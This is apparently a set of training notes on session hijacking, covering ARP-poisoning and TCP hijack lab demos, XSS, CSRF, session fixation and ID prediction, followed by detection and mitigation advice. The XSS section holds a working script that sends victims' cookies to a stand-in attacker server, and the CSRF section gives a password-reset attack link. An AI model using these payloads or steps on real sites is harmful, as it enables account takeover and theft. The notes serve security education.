# Session Hijacking
**Description:**
Session hijacking is a type of cyberattack where an attacker takes control of a legitimate user's session on a computer system, network, or application. The attacker intercepts or steals the session identifier (e.g., session cookie or token) to impersonate the victim and gain unauthorized access to the system or application. In brief, it is impersonation of an authenticated user.

### Passive Session Hijacking
**Description:**
Passive session hijacking is a type of session hijacking attack where the attacker eavesdrops on the communication between the client and server to capture session identifiers without actively interfering with the traffic. The attacker aims to intercept sensitive information transmitted during the session, such as authentication credentials or session tokens, without alerting the victim or raising suspicion.

**Example:**
An attacker uses a network sniffer tool to capture packets exchanged between a user's web browser and a banking website. By analyzing the captured traffic, the attacker identifies the session cookie used for authentication. The attacker can then use this session cookie to impersonate the user and gain unauthorized access to the banking website without the user's knowledge.

### Active Session Hijacking
**Description:**
Active session hijacking is a type of session hijacking attack where the attacker actively interferes with the communication between the client and server to intercept or manipulate session identifiers. Unlike passive session hijacking, the attacker modifies network traffic or injects malicious code to steal session tokens or manipulate session-related data.

**Example:**
An attacker performs a man-in-the-middle (MitM) attack to intercept traffic between a user and an online shopping website. The attacker injects malicious JavaScript code into the web pages served by the website, which steals the user's session cookie upon execution. With the stolen session cookie, the attacker can impersonate the user and make unauthorized purchases or access sensitive account information.

## ***Network Layer Session Hijacking***
Network layer session hijacking takes place at the network level of the OSI model. Attackers intercept and manipulate network packets to steal session identifiers or manipulate session-related data, bypassing application-level security controls. This type of hijacking can be more difficult to detect and mitigate compared to application layer hijacking.

**Example:**
An attacker intercepts network traffic between a user and an online banking website. Using a man-in-the-middle attack, the attacker manipulates the packets to hijack the session. By redirecting traffic to a server under their control, the attacker gains access to sensitive user data, such as login credentials and financial information. This allows the attacker to perform unauthorized transactions or steal personal information.

### Types
**Blind Hijacking:**
Blind hijacking is a type of session hijacking attack where the attacker attempts to hijack a session without having access to the actual session data. In blind hijacking, the attacker relies on guesswork or brute force techniques to predict or guess session identifiers, such as session cookies or tokens. This can be challenging for the attacker since they lack direct access to the session information and may require extensive trial and error to succeed.

**UDP Hijacking:**
UDP (User Datagram Protocol) hijacking involves the interception and manipulation of UDP packets to hijack a session between a client and server. Unlike TCP, UDP is connectionless and does not include mechanisms for session establishment or maintenance. As a result, UDP hijacking attacks typically target applications or services that use UDP for communication, such as online gaming or VoIP (Voice over Internet Protocol) applications. Attackers may inject or modify UDP packets to disrupt communication, inject malicious payloads, or hijack sessions between the client and server.

**RST Hijacking:**
RST (Reset) hijacking is a technique used to hijack TCP sessions by sending forged TCP RST packets to terminate established connections between a client and server. TCP RST packets are used to signal the abrupt termination of a TCP connection, and they can be abused by attackers to forcibly close connections between legitimate parties. By spoofing or injecting TCP RST packets into the network traffic, the attacker can disrupt ongoing sessions, terminate connections prematurely, or manipulate the flow of data between the client and server. RST hijacking attacks can be effective in disrupting communication and causing denial-of-service (DoS) conditions for targeted services or applications.


**TCP Session Hijacking**
- **Description**:
  - Manipulates or takes over an active TCP session by spoofing the connection and injecting malicious traffic.
- **Demo Process**:
  1. **Set up a Telnet Session**:
     - Establish a Telnet session between a client and server (e.g., Metasploitable server).
  2. **Use ARP Poisoning**:
     - Deploy `Ettercap` for ARP poisoning to redirect traffic.
     - Identify target devices and place yourself in the middle of their communication.
  3. **Sniff Traffic with Wireshark**:
     - Capture IPs, ports, and data exchanges.
     - Analyze TCP streams for critical details like source and destination.
  4. **Hijack the Session**:
     - Use `Shyjack` to hijack the session:
       - Provide source IP, destination IP, and port details.
       - Inject commands to control the session (e.g., file creation or directory listing).
  5. **Verification**:
     - Observe changes on the target system to confirm hijack success.
- **Key Tools**:
  - `Ettercap`: ARP poisoning.
  - `Wireshark`: Packet capture and analysis.
  - `Shyjack`: TCP session hijacking.


**Session Token Hijacking**
- **Description**:
  - Captures session tokens from HTTP traffic and reuses them to impersonate a user.
- **Process**:
  1. **Capture HTTP Traffic**:
     - Use tools like `Wireshark` to sniff HTTP packets.
  2. **Extract the Session Token**:
     - Identify and copy session cookies or tokens from the captured traffic.
  3. **Inject the Token**:
     - Use browser developer tools to replace the session token.
     - Validate by navigating the target's session with their permissions.


## Demonstrations
### **Example: TCP Session Hijacking**
1. **Setup**:
   - Use a Kali Linux attacker machine and a Metasploitable server.
   - Open a Telnet session from the client to the server.
2. **Attack Execution**:
   - Launch `Ettercap` to perform ARP poisoning.
   - Use `Wireshark` to capture TCP session details like IPs and ports.
   - Execute `Shyjack` with the captured details to hijack the session.
   - Inject commands (e.g., `touch pwned`) to confirm the hijack.
3. **Validation**:
   - Use `Wireshark` to analyze session activity and confirm malicious changes.



## Tools Used
- **Ettercap**: For ARP poisoning and man-in-the-middle attack setup.
- **Wireshark**: For network packet capture and analysis.
- **Shyjack**: For direct TCP session hijacking.
- **Developer Tools**: For manipulating session tokens during HTTP hijacks.
  

## Key Concepts
- **Man-in-the-Middle (MITM)**:
  - Most session hijacking techniques depend on intercepting communication between the victim and the server.
- **Connection-Oriented vs. Connectionless**:
  - TCP hijacking relies on exploiting sequence numbers in a connection-oriented protocol.
  - UDP hijacking leverages the stateless nature of UDP for easier injection.
- **Network Analysis**:
  - Tools like `Wireshark` help visualize and extract session details.

## Best Practices for Defenders
- Use encryption (e.g., HTTPS) to protect session tokens.
- Implement robust sequence number randomization.
- Monitor for unusual traffic patterns or ARP poisoning attempts.
- Regularly update and patch network tools and devices.



# Application-Level Session Hijacking 

## Overview
Application-level session hijacking involves exploiting vulnerabilities in web applications to intercept, manipulate, or predict session data. Attackers use various techniques to impersonate legitimate users, gaining unauthorized access to sensitive information or actions.

## Description
Application layer session hijacking occurs when an attacker exploits vulnerabilities in web applications or software to steal session identifiers or manipulate session-related data. By targeting weaknesses in the application logic or implementation, the attacker can gain unauthorized access to user accounts, manipulate transactions, or extract sensitive information.


## Common Application-Level Session Hijacking Attacks

### 1. **Sniffing**
- **Description**: Passively monitors network traffic to capture session IDs, tokens, or cookies.
- **How It Works**:
  1. Use tools like `Wireshark` to sniff network traffic.
  2. Extract session tokens or cookies from captured packets.
  3. Inject captured tokens into your browser or API client to hijack the session.
- **Key Notes**:
  - Effective on unsecured networks or during VLAN hopping.
  - Passive until tokens are actively used.



### 2. **Man-in-the-Middle (MITM) Attacks**
- **Description**: Actively intercepts and manipulates communication between a user and a server.
- **Variants**:
  - **Man-in-the-Browser**: A malware-based MITM attack using tools like `BeEF` (Browser Exploitation Framework).
    - Hooks browsers via cross-site scripting (XSS) or direct injection.
    - Allows full control over browser actions, including stealing cookies or performing actions on behalf of the victim.

---

### 3. **Cross-Site Scripting (XSS)**
- **Description**: Injects malicious scripts into web applications to exploit user sessions.
- **Process**:
  1. Identify a vulnerable input in the web application (e.g., stored XSS).
  2. Inject a script to extract session cookies or tokens.
     - Example payload:
       ```javascript
       <script>
       new Image().src="http://attacker-server:8000/steal.php?cookie=" + document.cookie;
       </script>
       ```
  3. Set up an HTTP server (e.g., Python) to capture requests with stolen session cookies.
  4. Use captured cookies to hijack the session.
- **Variations**:
  - **Stored XSS**: Targets multiple users accessing a page.
  - **Reflected XSS**: Requires user interaction (e.g., phishing links).

**Example:**
An attacker exploits a Cross-Site Scripting (XSS) vulnerability in a web application to inject malicious JavaScript code into a user's browser. The injected malicious JavaScript code steals the user's session cookie, granting the attacker unauthorized access to the user's session on the banking website. With the session hijacked, the attacker can now impersonate the user, view account balances, initiate transactions, or perform any actions that the legitimate user would be able to do. This type of attack demonstrates how network layer session hijacking, combined with other vulnerabilities like XSS, can lead to severe security breaches and financial loss for victims.

**Example:**
An attacker finds an XSS vulnerability on a social media site and posts a message containing a malicious script. When other users view the message, the script runs in their browsers, stealing their session cookies and sending them to the attacker.


### 4. **Compression Ratio Info Leak Made Easy (CRIME)**
- **Description**: Exploits vulnerabilities in SSL/TLS compression (SPDY) to reveal encrypted information.
- **Key Points**:
  - Attacks leverage patterns in compressed data to infer sensitive information.
  - Largely mitigated by modern patches.

**Example:**
An attacker injects various payloads into a secure connection and measures the compressed response sizes. By analyzing the differences in sizes, the attacker can deduce the content of the session cookie or other sensitive data.


### 5. **Session Fixation**
- **Description**: Forces a victim to use a specific session ID controlled by the attacker.
- **Steps**:
  1. The attacker generates a valid session ID.
  2. Delivers the session ID to the victim through phishing or crafted links.
  3. Once the victim logs in, the attacker uses the known session ID to access the session.
- **Example**:
  - URL: `https://example.com?sessionid=12345`

**Example:**
An attacker sends a phishing email with a link to a legitimate login page, but with a predefined session ID in the URL. When the victim clicks the link and logs in, the attacker can use the same session ID to access the victim's account.


### 6. **Session Donation**
- **Description**: Similar to fixation, but the attacker donates their session ID to the victim.
- **Process**:
  1. The attacker logs in to create a session ID.
  2. Sends the session ID to the victim.
  3. The attacker uses the session ID to monitor or manipulate the session.

**Example:**
An attacker uses a script to forcefully log the user out and then redirects the user to a page with the attacker's session ID. The user continues their session using the attacker's ID, which the attacker can then use to access the user's session.


### 7. **Cross-Site Request Forgery (CSRF)**
- **Description**: Exploits a user’s authenticated session to perform unauthorized actions.
- **Example**:
  1. Create a malicious link triggering a password reset or fund transfer:
     ```
     https://example.com/resetpassword?newpassword=AttackerPassword123
     ```
  2. Send the link to the victim.
  3. Once clicked, the action is executed under the victim’s session.

**Example:**
A user is logged into their banking website. An attacker sends the user an email with a link to a malicious site. The malicious site has a script that sends a request to transfer money from the user's bank account to the attacker's account without the user's knowledge.


### 8. **Session ID Prediction**
- **Description**: Predicts or brute-forces session IDs to hijack a session.
- **Key Steps**:
  1. Analyze patterns in session ID generation (e.g., sequential numbers).
  2. Test predicted session IDs to see if they match active sessions.
- **Example**:
  - Current Session ID: `sess123`
  - Predicted Session ID: `sess122` or `sess124`

**Example:**
An attacker notices that session IDs on a website are generated sequentially. By analyzing a few session IDs, the attacker predicts the next valid session ID. The attacker then uses this session ID to hijack a user's session and access their account.

## Tools and Frameworks
- **Wireshark**: For traffic sniffing and packet analysis.
- **BeEF**: For browser exploitation and man-in-the-browser attacks.
- **Python HTTP Server**: For capturing session cookies during XSS attacks.

## Mitigation Strategies
- **Encryption**: Use HTTPS to secure data in transit.
- **Secure Cookies**:
  - Mark cookies as `HttpOnly` and `Secure`.
  - Implement `SameSite` attributes.
- **Session Management**:
  - Regenerate session IDs upon login.
  - Expire sessions after a period of inactivity.
- **Input Validation**: Sanitize user inputs to prevent XSS and CSRF.
- **CSRF Tokens**: Use unique tokens to validate requests.

# Session Hijacking Countermeasures

## Overview
Session hijacking countermeasures aim to detect, prevent, and mitigate session hijacking attacks. This guide addresses strategies for both end users and web application developers or administrators to protect sessions effectively.

## Detection Strategies
Detecting session hijacking requires tools and techniques to monitor and analyze abnormal activities in a network or application.

### Manual Detection
- **Monitor Network Traffic**:
  - Establish baselines for normal traffic levels.
  - Identify unusual spikes or patterns indicating potential attacks (e.g., session hijacking, denial-of-service attacks).
- **Inspect Packet Data**:
  - Use tools like `Wireshark` to examine packets for anomalies, such as unexpected tokens or unusual source/destination combinations.
- **Check ARP Cache Entries**:
  - Look for duplicate entries, which may signal ARP poisoning and a potential man-in-the-middle attack.

### Automated Detection
- **Intrusion Detection Systems (IDS) and Intrusion Prevention Systems (IPS)**:
  - Use to identify suspicious behavior and block attacks in real time.
- **Security Information and Event Management (SIEM)**:
  - Implement solutions with real-time threat detection and analysis.
- **Web Application Firewalls (WAFs)**:
  - Block malicious traffic targeting web applications.

## Preventative Measures

### For End Users
1. **Use Encrypted Connections**:
   - Always prefer HTTPS over HTTP.
   - Verify the HTTPS lock icon in browsers to ensure secure sessions.
2. **Log Out After Use**:
   - Avoid leaving sessions open to minimize the risk of session hijacking.
3. **Avoid Clicking Suspicious Links**:
   - Verify the legitimacy of links before clicking, especially in emails or messages.
4. **Maintain Security Hygiene**:
   - Regularly update software and browsers.
   - Use strong, unique passwords and enable two-factor authentication (2FA) where possible.


### For Web Application Developers and Admins
1. **Session Management**:
   - Randomize session IDs to prevent ID prediction.
   - Regenerate session IDs upon user login to invalidate old ones.
   - Avoid assigning session tokens to unauthenticated users.
2. **Encrypt Data**:
   - Implement TLS for secure communication.
   - Use `IPsec` for encrypting network-level communications.
3. **Session Expiry**:
   - Automatically log users out after periods of inactivity.
   - Implement short expiration times for session tokens.
4. **Validate Requests**:
   - Ensure sessions originate from the same host by validating:
     - Source IP
     - User-Agent string
     - Referrer headers
   - Use geolocation checks to flag unexpected access patterns.
5. **Implement Security Headers**:
   - Use `HttpOnly`, `Secure`, and `SameSite` attributes for cookies.
6. **Defend Against Session Fixation**:
   - Ensure that session IDs change after user authentication.
   - Avoid embedding session tokens in URLs.

## Examples and Best Practices

### Example: Encryption in Practice
- **Telnet vs. SSH**:
  - Telnet transmits data in plain text, making it vulnerable to sniffing and session hijacking.
  - SSH encrypts data, significantly reducing these risks.
  - Modern web applications should similarly enforce HTTPS and encrypt all communications.

### Example: Web Application Security
- **Login Example**:
  - Users logging into sites like Facebook are redirected to HTTPS.
  - Prevent HTTP downgrades to reduce vulnerabilities.
- **Banking Applications**:
  - Implement short session timeouts and device-based authentication to secure sensitive accounts.

## Key Takeaways
1. **Detection**:
   - Monitor and analyze traffic using tools like IDS, IPS, and SIEMs.
   - Check for anomalies in ARP caches and network patterns.
2. **Prevention**:
   - Encrypt communications.
   - Regularly log out inactive sessions and validate the origin of requests.
   - Educate users on safe browsing habits and link verification.
3. **Developer Responsibilities**:
   - Use secure coding practices to randomize session IDs and protect cookies.
   - Implement server-side checks for consistent session integrity.
4. **User Awareness**:
   - Stay vigilant against phishing and other social engineering attacks.
